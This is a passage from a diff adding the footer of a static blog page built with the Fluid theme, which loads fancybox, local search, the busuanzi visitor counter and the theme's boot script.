+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
